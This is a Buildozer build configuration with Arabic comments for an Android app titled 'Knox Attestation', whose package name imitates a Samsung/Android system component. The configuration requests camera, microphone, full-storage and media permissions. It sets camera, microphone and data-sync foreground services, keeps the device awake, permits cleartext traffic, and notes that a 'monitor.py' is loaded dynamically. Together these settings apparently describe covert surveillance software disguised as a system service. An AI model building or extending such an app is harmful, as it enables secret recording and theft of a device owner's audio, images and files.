[app]
# اسم التطبيق الظاهر للمستخدم
title = Knox Attestation
# اسم الحزمة الداخلي (package)
package.name = knoxattest
# النطاق البرمجي
package.domain = com.android.knox

# المصادر
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite
source.exclude_dirs = tests,__pycache__,docs,.github

# ✅ رفع الإصدار لضمان تحديث نظيف (بدون تعارض مع بيانات الإصدارات السابقة)
version = 2.6.1

# ✅ المتطلبات البرمجية الخفيفة (بدون opencv-python للحفاظ على حجم APK صغير)
# تم استخدام tflite-runtime لتشغيل نموذج NSFW، و pillow لمعالجة الصور الأساسية
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tflite-runtime

# أيقونة التطبيق (اذكر مسارها أو علق السطر إذا لم تكن موجودة)
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# الصلاحيات المطلوبة
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

# إعدادات SDK/NDK
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.build_tools_ver = 33.0.0
android.accept_sdk_license = True
android.archs = arm64-v8a

# ✅ منع التعارض مع بيانات النسخ القديمة
android.allow_backup = False
android.request_legacy_external_storage = True

# ✅ تشغيل الخدمة في المقدمة (Foreground) لضمان عدم إغلاق التطبيق في الخلفية
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.uses_cleartext_traffic = True

# بيانات تعريفية إضافية (خاصة بـ Knox)
android.meta_data = com.samsung.android.knox.intent.action.KNOX_ATTESTATION=true

# إعدادات الشاشة والعرض
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

# تم حذف سطر android.services لأن monitor.py يُحمَّل ديناميكياً

[buildozer]
log_level = 2
warn_on_root = 0
